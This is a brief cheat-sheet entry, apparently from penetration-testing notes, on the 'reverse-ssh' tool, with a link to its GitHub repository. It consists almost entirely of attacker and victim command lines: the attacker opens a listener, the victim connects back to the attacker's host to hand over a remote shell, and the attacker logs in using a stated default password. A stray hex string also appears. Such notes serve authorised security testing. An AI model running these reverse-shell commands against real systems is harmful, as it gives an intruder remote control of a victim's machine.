# reverse-ssh

```bash
# On attacker (get ready to catch the incoming request;
# can be omitted if you already have an ssh daemon running, e.g. OpenSSH)
# NOTE: LPORT of 8888 collides with incoming connections; use the flag `-b 8889` or similar on the victim in that case
attacker$ ./reverse-ssh -v -l -p <LPORT>

# On victim
victim$ ./reverse-ssh -p <LPORT> <LHOST>
# or in case of an ssh daemon listening at port 22 with password authentication for user 'kali'
victim$ ./reverse-ssh -p 22 kali@<LHOST>

# On attacker (default password: letmeinbrudipls)
attacker$ ssh -p 8888 127.0.0.1
```

22267bb6f2049baf


https://github.com/Fahrj/reverse-ssh
